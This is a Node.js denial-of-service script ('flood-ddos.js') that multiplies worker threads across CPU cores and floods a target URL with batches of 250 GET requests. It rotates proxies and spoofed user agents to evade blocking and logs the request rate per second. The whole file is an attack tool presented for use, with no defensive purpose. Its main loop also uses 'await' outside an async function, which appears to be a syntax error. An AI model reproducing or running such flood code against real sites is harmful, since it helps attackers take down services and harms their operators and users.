const { Worker, isMainThread, workerData } = require('worker_threads');
const fs = require('fs');
const http = require('http');
const https = require('https');
const { HttpsProxyAgent } = require('https-proxy-agent');

let proxyList = [];
let userAgentList = [];

try {
    proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
} catch(e) { proxyList = ['127.0.0.1:8080']; }

try {
    userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
} catch(e) { userAgentList = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']; }

if (isMainThread) {
    const [url, time] = process.argv.slice(2);
    const timeLimit = parseInt(time);
    if (!url || !timeLimit) {
        console.log('Usage: node flood-ddos.js <url> <seconds>');
        process.exit(1);
    }

    const numWorkers = require('os').cpus().length * 2;
    console.log(`WORM G-KH-INJECTED: Starting ${numWorkers} workers for ${timeLimit}s on ${url}`);

    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: { url, timeLimit, workerId: i, proxyList, userAgentList }
        });
        worker.on('error', (err) => console.log(`Worker ${i} error: ${err.message}`));
    }
} else {
    const { url, timeLimit, workerId, proxyList, userAgentList } = workerData;
    
    const sendRequest = async (targetUrl, proxy, ua) => {
        return new Promise((resolve) => {
            try {
                const agent = new HttpsProxyAgent(`http://${proxy}`);
                const parsedUrl = new URL(targetUrl);
                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname + parsedUrl.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': ua,
                        'Host': parsedUrl.hostname,
                        'Cache-Control': 'no-cache',
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    },
                    agent: agent,
                    timeout: 2000
                };
                const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {
                    res.resume();
                    resolve();
                });
                req.on('error', () => resolve());
                req.on('timeout', () => { req.destroy(); resolve(); });
                req.end();
            } catch(e) { resolve(); }
        });
    };

    const endTime = Date.now() + timeLimit * 1000;
    let sent = 0;
    
    const interval = setInterval(() => {
        console.log(`WORM ${workerId}: ${sent} req/s`);
        sent = 0;
    }, 1000);

    while (Date.now() < endTime) {
        const promises = [];
        for (let i = 0; i < 250; i++) {
            const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
            const ua = userAgentList[Math.floor(Math.random() * userAgentList.length)];
            promises.push(sendRequest(url, proxy, ua));
            sent++;
        }
        await Promise.allSettled(promises);
    }
    clearInterval(interval);
}